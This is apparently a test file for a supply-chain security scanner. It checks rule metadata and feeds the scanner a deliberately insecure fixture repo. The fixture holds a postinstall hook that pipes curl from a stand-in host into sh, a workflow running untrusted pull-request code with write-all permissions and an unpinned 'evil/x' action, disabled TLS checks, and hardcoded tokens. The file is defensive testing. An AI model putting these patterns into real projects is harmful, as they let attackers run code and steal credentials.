import { describe, expect, it } from "vitest";
import { RULES } from "../../../src/agents/supply-chain/rules.meta.js";
import { ALL_RULES, ruleMeta } from "../../../src/rules/catalog.js";
import { agent } from "../../../src/agents/supply-chain/index.js";
import { memContext } from "../../helpers/memfs.js";
import { ids, npmLock, pkg } from "./support.js";

const EXPECTED = [
  "SUP-000", "SUP-001", "SUP-002", "SUP-003", "SUP-004", "SUP-005", "SUP-006", "SUP-008", "SUP-009", "SUP-010",
  "SUP-011", "SUP-012", "SUP-013", "SUP-014", "SUP-015", "SUP-016", "SUP-017", "SUP-018", "SUP-019", "SUP-020",
];

describe("supply-chain rule catalog", () => {
  it("documents every rule the agent can raise, exactly once", () => {
    expect(RULES.map((r) => r.id).sort()).toEqual([...EXPECTED].sort());
  });
  it("fills every field with something meaningful", () => {
    for (const r of RULES) {
      expect(r.agent, r.id).toBe("supply-chain");
      expect(r.title.length, r.id).toBeGreaterThan(8);
      expect(r.summary.length, r.id).toBeGreaterThan(40);
      expect(r.fix.length, r.id).toBeGreaterThan(20);
      expect(r.modes, r.id).toEqual(["static"]);
      expect(r.id === "SUP-000" || r.cwe !== undefined, r.id).toBe(true);
      expect(r.owasp === undefined || /^A(06|08)$/.test(r.owasp) || r.id === "SUP-008", `${r.id} ${r.owasp}`).toBe(true);
    }
  });
  it("uses the agreed CWEs and default severities", () => {
    const m = (id: string) => RULES.find((r) => r.id === id);
    expect(m("SUP-001")?.cwe).toBe("CWE-1357");
    expect(m("SUP-003")).toMatchObject({ cwe: "CWE-829", severity: "high" });
    expect(m("SUP-004")).toMatchObject({ cwe: "CWE-506", severity: "critical" });
    expect(m("SUP-009")).toMatchObject({ cwe: "CWE-829", severity: "low" });
    expect(m("SUP-010")).toMatchObject({ cwe: "CWE-1395", owasp: "A06", severity: "critical" });
    expect(m("SUP-014")).toMatchObject({ cwe: "CWE-94", severity: "critical" });
    expect(m("SUP-015")).toMatchObject({ cwe: "CWE-94", severity: "high" });
    expect(m("SUP-018")).toMatchObject({ severity: "high" });
    expect(m("SUP-008")).toMatchObject({ cwe: "CWE-798", severity: "critical" });
  });
  it("is wired into the global catalog", () => {
    for (const id of EXPECTED) expect(ruleMeta(id)?.agent, id).toBe("supply-chain");
    expect(ALL_RULES.filter((r) => r.id.startsWith("SUP-")).length).toBe(EXPECTED.length);
  });
  it("covers every rule id raised on a deliberately bad repo, with matching CWE", async () => {
    const files: Record<string, string> = {
      "package.json": pkg(
        { chalk: "5.6.1", "react-d0m": "1.0.0", "openai-utils": "1.0.0", lodash: "latest", next: "canary", gitdep: "user/repo" },
        { scripts: { postinstall: "curl -s https://x.example | sh" }, overrides: { foo: "github:u/foo" } },
      ),
      "package-lock.json": npmLock({ "node_modules/sketchy": { version: "1.0.0", hasInstallScript: true }, "node_modules/next": { version: "14.2.24", resolved: "r", integrity: "i" } }),
      ".npmrc": "strict-ssl=false\n//r/:_authToken=abcdefghijklmnop\n",
      "middleware.ts": "export default auth(() => {})",
      ".github/workflows/a.yml": "on: pull_request_target\npermissions: write-all\njobs:\n  j:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.head_ref }}\n      - uses: evil/x@main\n      - run: echo ${{ github.event.issue.title }}\n",
      "AGENTS.md": "x\u200B\n",
      ".mcp.json": JSON.stringify({ mcpServers: { s: { command: "npx", args: ["-y", "pkg"], env: { MY_TOKEN: "literal-value-1" } } } }),
      "bad/package.json": "{ nope",
    };
    const findings = await agent.run(memContext(files));
    const raised = new Set(ids(findings));
    for (const id of raised) expect(RULES.some((r) => r.id === id), id).toBe(true);
    for (const f of findings) {
      const meta = RULES.find((r) => r.id === f.ruleId);
      if (f.cwe) expect(meta?.cwe, f.ruleId).toBe(f.cwe);
    }
    for (const id of ["SUP-000", "SUP-001", "SUP-002", "SUP-003", "SUP-004", "SUP-005", "SUP-008", "SUP-009", "SUP-010", "SUP-011", "SUP-012", "SUP-013", "SUP-014", "SUP-015", "SUP-016", "SUP-017", "SUP-018", "SUP-019", "SUP-020"]) {
      expect(raised.has(id), id).toBe(true);
    }
  });
});
